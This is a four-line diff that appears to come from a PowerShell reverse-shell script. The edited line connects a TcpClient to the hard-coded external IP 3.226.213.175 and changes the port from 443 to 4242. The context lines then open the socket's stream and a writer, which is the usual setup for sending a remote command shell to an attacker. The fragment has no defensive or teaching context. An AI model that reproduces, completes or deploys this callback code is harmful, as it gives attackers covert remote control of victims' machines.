@@ -1,4 +1,4 @@
-$socket = new-object System.Net.Sockets.TcpClient('3.226.213.175', 443);
+$socket = new-object System.Net.Sockets.TcpClient('3.226.213.175', 4242);
 if($socket -eq $null){exit 1}
 $stream = $socket.GetStream();
 $writer = new-object System.IO.StreamWriter($stream);
